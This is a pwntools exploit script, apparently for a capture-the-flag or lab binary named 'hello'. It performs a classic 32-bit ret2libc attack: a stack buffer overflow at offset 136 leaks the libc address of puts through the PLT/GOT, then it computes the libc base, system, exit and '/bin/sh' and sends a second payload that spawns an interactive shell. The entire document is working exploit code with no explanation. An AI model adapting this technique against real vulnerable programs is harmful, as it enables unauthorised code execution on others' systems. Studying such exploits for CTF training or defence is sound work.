from pwn import *

elf = context.binary = ELF("./hello", checksec=False)
libc = elf.libc

io = elf.process()

offset_to_return = 136

got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
main_func = elf.symbols['main']
padding = offset_to_return * "A"


io.recv()

payload = padding + p32(plt_puts) + p32(main_func) + p32(got_puts)

io.sendline(payload)

io.recvline()

libc_puts = io.recvline().split(" ")[0]
libc_puts = bytearray(libc_puts).ljust(4, b'\x00')
libc_puts = u32(libc_puts, endian='little')
print("Leaked PUTS@GLIBC address: ", hex(libc_puts))


# Calculating LIBC base, and system, /bin/sh addresses
libc_base_addr = libc_puts - libc.symbols['puts']

print("Leaked GLIBC base address: ", hex(libc_base_addr))
libc_system_addr = libc_base_addr + libc.symbols['system']
libc_binsh_addr = libc_base_addr + libc.search(b"/bin/sh\x00").next()
libc_exit_addr = libc_base_addr + libc.symbols['exit']
payload = padding + p32(libc_system_addr) + p32(libc_exit_addr) + p32(libc_binsh_addr)

io.sendline(payload)

io.interactive()
